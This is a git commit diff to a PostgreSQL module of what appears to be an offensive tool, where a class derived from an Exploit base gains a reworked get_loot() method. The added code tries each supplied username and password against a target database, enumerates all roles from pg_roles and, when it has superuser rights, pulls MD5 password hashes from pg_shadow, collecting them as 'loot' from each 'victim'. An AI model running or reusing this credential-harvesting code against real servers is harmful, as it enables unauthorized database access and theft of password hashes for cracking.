7492443fd6fba16383ca1c3bd629300351b1152a
Grace Hseu <gracehseu@gmail.com>
2019-04-28 23:09:45 -0500

    postgresql get_loot() added getting md5 hashes and output

--- scripts/postgresql.py
+++ scripts/postgresql.py
@@ -5,33 +5,57 @@ class postgresql(Exploit):
     port = 5432
     # def attack(self, ip_address):
     #     pass
-    def get_loot(self, ip_address, credentials):
+
+    def get_loot(ip_address, credentials):
         more_loot = []
+        loot_dict = {}
+        ip_address = str(ip_address)
         # go through each secure username
         for victim in credentials:
             username = victim[0]
             password = victim[1]
+            print("Trying to connect to PostgreSQL with IP address {} with:\n username {} and password {}".format(ip_address, username, password))
 
             # start the log in process
             try:
-                trystr = "dbname=postgres hotst={} user={} password={}".format(ip_address, username, password)
+                trystr = "dbname=postgres host={} user={} password={}".format(ip_address, username, password)
                 conn = psycopg2.connect(trystr)
             except psycopg2.OperationalError:
-                pass
+                print("Authentication failed.")
+                continue
 
             # opens a cursor to perform psql ops    
             cur = conn.cursor()
-            
+        
             # enumerates all the usernames, the passwords are md5 hashed 
             # and only in viewable as root
-            cur.execute("select * from pg_roles")
-
+            try:
+                cur.execute("select * from pg_roles")
+            except (psycopg2.OperationalError, psycopg2.InternalError) as e:
+                continue
             # opening up returns
-            for l in cur.fetchall:
-                # returns a tuple ('username', )
-                more_loot.append((l[0], ))
+            print('Success. Gathering all usernames.')
+            for l in cur.fetchall():
+                # adds if the username is not already in there
+                if loot_dict.get(l[0]) == None:
+                    loot_dict[l[0]] = ""
 
-            # in psql users are global one crack and get all others
-            # so close return file to not get a bunch of others
-            return more_loot
-    return more_loot
+            # tries to possibly get md5 hashes if in case it is a superuser
+            try:
+                cur.execute("select usename, passwd from pg_shadow")
+                for l in cur.fetchall():
+                    # adds if the username is not already in there
+
+                    if loot_dict.get(l[0]) == None:
+                        loot_dict[l[0]] = l[1]
+                    else:
+                        loot_dict[l[0]] = l[1]
+                print('Success. Gathering all md5 hashes.')
+                        
+            except psycopg2.ProgrammingError:
+                pass
+
+        for k, v in loot_dict.items():
+            more_loot.append((k, v))
+
+        return more_loot
